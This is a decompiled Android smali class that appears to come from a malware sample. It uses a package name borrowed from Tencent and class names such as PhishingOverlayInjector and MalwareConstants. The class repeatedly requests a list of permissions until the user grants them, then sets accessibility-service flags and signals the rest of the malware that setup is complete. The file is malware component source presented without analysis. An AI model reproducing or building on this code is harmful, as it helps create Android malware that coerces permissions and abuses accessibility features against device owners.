.class public Lcom/tencent/PhishingOverlayInjector;
.super Landroid/app/Activity;
.source "interfacexseekz12.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static varargs hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 4

    if-eqz p0, :cond_1

    if-eqz p1, :cond_1

    .line 19
    array-length v0, p1

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    if-ge v2, v0, :cond_1

    aget-object v3, p1, v2

    .line 20
    invoke-static {p0, v3}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    return v1

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    const/4 p0, 0x1

    return p0
.end method


# virtual methods
.method public finish()V
    .locals 1

    const/4 v0, 0x0

    .line 108
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/DataPackagingEngine;->asked:Ljava/lang/Boolean;

    .line 110
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1

    .line 33
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 38
    :try_start_0
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_prim:Ljava/lang/Boolean;

    .line 43
    invoke-static {}, Lcom/tencent/DataPackagingEngine;->PERMISSIONS()[Ljava/lang/String;

    move-result-object p1

    .line 45
    invoke-static {p0, p1}, Lcom/tencent/PhishingOverlayInjector;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    const/16 v0, 0x97

    .line 46
    invoke-static {p0, p1, v0}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 52
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 0

    .line 64
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x97

    if-eq p1, p2, :cond_0

    goto :goto_0

    .line 73
    :cond_0
    array-length p1, p3

    if-lez p1, :cond_1

    const/4 p1, 0x0

    aget p3, p3, p1

    if-nez p3, :cond_1

    .line 75
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_prim:Ljava/lang/Boolean;

    const/4 p1, 0x1

    .line 76
    sput-boolean p1, Lcom/tencent/AccessibilityServiceCore;->ifFinishiInitPermission:Z

    .line 78
    invoke-virtual {p0}, Lcom/tencent/PhishingOverlayInjector;->finish()V

    .line 80
    new-instance p1, Lcom/tencent/AccessibilityEventMonitor$Event;

    sget-object p2, Lcom/tencent/MalwareConstants;->Evnet_Type_PerfectSetting:Ljava/lang/String;

    invoke-direct {p1, p2}, Lcom/tencent/AccessibilityEventMonitor$Event;-><init>(Ljava/lang/String;)V

    invoke-static {p1}, Lcom/tencent/AccessibilityEventMonitor;->publish(Lcom/tencent/AccessibilityEventMonitor$Event;)V

    goto :goto_0

    .line 84
    :cond_1
    invoke-static {}, Lcom/tencent/DataPackagingEngine;->PERMISSIONS()[Ljava/lang/String;

    move-result-object p1

    .line 86
    invoke-static {p0, p1, p2}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :goto_0
    return-void
.end method
